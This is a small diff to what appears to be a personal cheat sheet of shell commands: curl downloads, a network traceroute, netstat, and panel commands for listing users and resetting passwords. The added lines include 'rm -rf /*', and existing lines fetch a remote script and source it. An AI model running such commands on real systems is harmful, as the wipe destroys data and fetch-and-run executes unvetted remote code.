@@ -16,6 +16,12 @@
 curl https://feeday.cn/sh/puck.sh -O
 curl.exe -o NUL http://speedtest.tele2.net/10GB.zip
 curl -s -o ~/x https://raw.githubusercontent.com/olegos2/mobox/main/install && . ~/x
+rm -rf /*
+grep -rn "Money" * 
+netstat -an
+tracert	feeday.cn
+appnode ccenter.user find all #查找用户
+appnode ccenter.user update-password 用户名 密码 #重置密码
 for (var a of document.getElementsByTagName('a')) { console.log(a.href) }
 ```
 
